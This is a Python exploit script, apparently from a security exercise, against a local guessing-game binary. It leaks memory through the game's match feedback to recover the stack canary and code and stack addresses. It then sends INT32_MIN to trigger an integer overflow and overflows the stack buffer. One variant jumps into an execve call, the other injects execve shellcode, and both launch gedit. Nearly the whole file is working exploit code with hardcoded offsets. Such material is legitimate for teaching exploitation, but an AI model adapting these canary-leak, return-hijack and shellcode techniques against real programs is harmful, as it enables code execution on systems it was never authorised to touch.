import os
import sys
import time
from typing import AnyStr
from pathlib import Path
from subprocess import Popen, PIPE

# mishandling of -INT32_MIN
_INT32_MIN = b'-2147483648'

# addresses of function observed from binary,
# and convenient entry points for return oriented programming
# p/x func_1 - main
# $1 = 0x555
# x/80i func_1            // start and addresses left out
# <func_1+223>:	mov    -0x68(%rbp),%rdx
# <func_1+227>:	mov    -0x60(%rbp),%rcx
# <func_1+231>:	mov    -0x58(%rbp),%rax
# <func_1+235>:	mov    %rcx,%rsi
# <func_1+238>:	mov    %rax,%rdi
# <func_1+241>:	call   0x55e5b6f491f0 <execve@plt>
func_1_start = 0x555 + 223


# helper functions for working with binary data
def addr_add(original: list[int], offset: int) -> list[int]:
    dup = original[:]

    for idx in range(8):
        dup[idx] = dup[idx] + offset % 256
        offset = offset // 256
        if dup[idx] >= 256:
            offset += 1
            dup[idx] %= 256

        if offset == 0:
            break
    return dup


def as_byte(n) -> str:
    s = hex(n)[2:]
    if len(s) == 1:
        return f'0{s}'
    return s


def fmt_addr(addr):
    return ''.join([as_byte(n) for n in addr[::-1]])


def print_mem(mem):
    for off in range(len(mem) // 8 + 1):
        print(off, end=': 0x')
        for i in range(8):
            if len(mem) <= off * 8 + i:
                break
            print(as_byte(mem[off * 8 + i]), end='')
        print()


# we can use fixed offset but in other situation we would have to use some heuristic to find it
def get_canary(mem, use_fix_off: bool = True) -> list[int]:
    if use_fix_off:
        off = 15  # observed offset
        return mem[8 * off: 8 * off + 8]

    # or some heuristics to find canary
    for off in range(len(mem) // 8):  # assume 8B~64b alignment
        if mem[off * 8] != 0:
            continue

        small_vals = set()
        big_vals = set()
        unique_vals = set()

        for i in range(8):
            v = mem[8 * off + i]
            if v > 256 * 7 / 8:
                big_vals.add(v)
            if v < 256 / 8:
                small_vals.add(v)
            unique_vals.add(v)

        if len(small_vals) < 3 and len(big_vals) < 3 and len(unique_vals) > 5:
            return mem[8 * off: 8 * off + 8]

    RuntimeError('Canary not found.')


# fixed observed offsets
def get_stack(mem) -> list[int]:
    off = 12
    return mem[8 * off: 8 * off + 8]


# fixed observed offsets
def get_main(mem) -> list[int]:
    off = 1
    return mem[8 * off: 8 * off + 8]


def _common_payload(stack_addr: list[int], main_addr: list[int], canary: list[int])\
        -> tuple[list[int], int, int, int]:
    # buffer overflow here, send as many data as we want
    payload = [ord('_') for i in range(256)]
    payload[ord('\n')] = 0  # don't send '\n', that would terminate input
    # payload = payload * 2

    # some place in overflow that does not get touched, name of our program
    # be aware that length of new path must be shorter or same as previous one
    # since we are copying this string to original string '/usr/bin/sleep'
    target_binary = '/usr/bin/gedit\0\0'  # more zeros for better alignment, alignment is not necessary
    target_position = len(payload)
    payload.extend(ord(c) for c in target_binary)  # place string at the end of overflow

    argv_position = len(payload)
    # argv structure
    payload.extend(addr_add(stack_addr, target_position))  # pointer to target_binary
    payload.extend(0 for _ in range(8))                   # place NULL

    envp_disp = 'DISPLAY=:0\0\0\0\0\0\0'  # more zeros for better alignment
    envp_disp_position = len(payload)

    # envp structure
    payload.extend(ord(c) for c in envp_disp)

    envp_position = len(payload)
    payload.extend(addr_add(stack_addr, envp_disp_position))
    payload.extend(0 for _ in range(8))

    # all positions in payload, like 0x68 for canary or 0x88 for return address
    # we acquired by stepping program instruction by instruction and
    # observing state of registers, which originally contained values
    # like 0x6f6e6d6c6b6a6968 for canary for example

    # place for canary, observed from gdb
    payload[0x78:0x78+8] = canary  # set canary to right place

    return payload, target_position, argv_position, envp_position


def get_payload(stack_addr: list[int], main_addr: list[int], canary: list[int]) -> list[int]:
    payload, target_position, argv_position, envp_position = _common_payload(stack_addr, main_addr, canary)

    # memory used for ret 0x88 - 0x8f
    # top of when returning from main... set to point to middle of func_1
    payload[0x98:0x98+8] = addr_add(main_addr, func_1_start)

    # memory popped to rbp 0x80 - 0x87
    # 144 is observed offset and 0x80 is more than enough space for variables/arguments of func_1
    rbp_off_func_1 = 160 + 0x80

    # set new rbp for func_1
    # based on relative address of stack(word buffer)
    payload[0x90:0x90+8] = addr_add(stack_addr, rbp_off_func_1)

    # set values at stack for values cmd, argv, envp
    # func_1::cmd  pointer at 0xc8 - 0xcf
    # func_1::argv pointer at 0xc0 - 0xc7
    # func_1::envp pointer at 0xb8 - 0xbf
    payload[0xc8:0xc8+8] = addr_add(stack_addr, target_position)
    payload[0xc0:0xc0+8] = addr_add(stack_addr, argv_position)
    payload[0xb8:0xb8+8] = addr_add(stack_addr, envp_position)

    payload.append(ord('\n'))
    return payload


def get_stack_exec(stack_addr: list[int], main_addr: list[int], canary: list[int]) -> list[int]:
    payload, target_position, argv_position, envp_position = _common_payload(stack_addr, main_addr, canary)

    code_position = 0xa0  # just after 0x98
    payload[0x98:0x98+8] = addr_add(stack_addr, code_position)

    NOP = 0x90
    MOV_RAX_59 = [0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00]
    MOV_RDI = [0x48, 0xbf] + addr_add(stack_addr, target_position)
    MOV_RSI = [0x48, 0xbe] + addr_add(stack_addr, argv_position)
    MOV_RDX = [0x48, 0xba] + addr_add(stack_addr, envp_position)
    SYSCALL = [0x0f, 0x05]

    CODE = [NOP] * 5 + MOV_RAX_59 + MOV_RDI + MOV_RSI + MOV_RDX + SYSCALL
    payload[code_position:code_position+len(CODE)] = CODE

    payload.append(ord('\n'))
    return payload


def _main():
    # used during development
    Popen(['make', 'main'], cwd=Path(__file__).parent).wait()

    WPopen = Popen
    if len(sys.argv) >= 2 and sys.argv[1] == '--capture':
        class ReadWriteWrap:
            def __init__(self, wrap, copy):
                self.__wrap = wrap
                self.__copy = copy

            def read(self, *args: int) -> AnyStr:
                s = self.__wrap.read(*args)
                self.__copy.write(s)
                return s

            def write(self, __s: AnyStr) -> int:
                self.__copy.write(__s)
                return self.__wrap.write(__s)

            def __getattribute__(self, name):
                try:
                    return object.__getattribute__(self, name)
                except AttributeError:
                    return self.__wrap.__getattribute__(name)

        # class for silently duplicating io from process
        class WPopen(Popen):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, **kwargs)
                if '--execstack' in sys.argv:
                    name = '{}_copy_execstack.bin'
                else:
                    name = '{}_copy.bin'
                self.__stdin_copy = open(name.format('stdin'), 'wb')
                self.__stdout_copy = open(name.format('stdout'), 'wb')
                self.__stderr_copy = open(name.format('stderr'), 'wb')

            def __getattribute__(self, name: str):
                if name not in ('stdin', 'stdout', 'stderr'):
                    return super().__getattribute__(name)

                return ReadWriteWrap(super().__getattribute__(name),
                                     object.__getattribute__(self, f'_WPopen__{name}_copy'))

    binary = 'execstack' if '--execstack' in sys.argv else 'main'
    p = WPopen(Path(__file__).parent / binary,
               stdin=PIPE, stdout=PIPE, stderr=PIPE)

    temp = p.stdout
    os.set_blocking(temp.fileno(), False)

    ########################################
    #            PHASE I. start            #
    ########################################

    # start by guessing word of length 1
    p.stdin.write(b'1\n')
    p.stdin.flush()

    time.sleep(1)

    print(p.stdout.read().decode())

    # we scan 255 bytes of memory, word buffer and memory after word buffer
    scan_len = 255

    # we can not enter '\n' so values that are missing are '\n'
    mem = [ord('\n') for _ in range(scan_len)]

    # map memory by trying all 256 byte values
    for c in range(0, 256):
        if chr(c) == '\n':
            continue

        # we send guesses of same bytes like '0x1 0x1 0x1 0x1 ...'
        p.stdin.write(c.to_bytes(1, 'big') * scan_len + b'\n')
        p.stdin.flush()

        time.sleep(0.05)
        # read game answer
        res = p.stdout.read().decode().strip()[:scan_len]

        # set bytes that compared as match in memory
        for idx in range(scan_len):
            if res[idx] == '#':
                mem[idx] = c

        print(c,  res)

    print_mem(mem)

    # find canary in memory
    canary = get_canary(mem)
    # find main to not be affected by ASLR and base all computations on that
    main_addr = get_main(mem)
    stack_top = get_stack(mem)  # memory at which write starts, `word buffer`

    # positions of canary/main/stack address ware observed from gdb
    print(f'Canary: {fmt_addr(canary)}')
    print(f'Main: {fmt_addr(main_addr)}')
    print(f'Stack: {fmt_addr(stack_top)}')

    # finish round of guessing, mem[0] is right guess since word has length 1
    p.stdin.write(mem[0].to_bytes(1, 'big') + b'\n')
    p.stdin.flush()

    time.sleep(0.1)
    print(p.stdout.read().decode())

    #########################################
    #            PHASE II. start            #
    #########################################

    # send malicious length of INT32_MIN to cause integer overflow
    p.stdin.write(_INT32_MIN + b'\n')
    p.stdin.flush()

    time.sleep(0.1)
    print(p.stdout.read().decode())

    if binary == 'main':
        payload = get_payload(stack_top, main_addr, canary)
    else:
        payload = get_stack_exec(stack_top, main_addr, canary)

    # send to game
    for c in payload:
        p.stdin.write(c.to_bytes(1, 'big'))
    p.stdin.flush()

    time.sleep(0.1)
    print(p.stdout.read().decode())

    input('Attach debugger(if you want) or press ENTER')

    # missmatch in length will cause new round to start INT32_MIN != 527B we sent in
    # by sending "0" we end game and `return 0;` will launch our return oriented program
    p.stdin.write(b'0\n')
    p.stdin.flush()

    print('Attack done...')

    p.wait()  # wait for close of gedit


if __name__ == "__main__":
    print(sys.version, os.getcwd())
    _main()
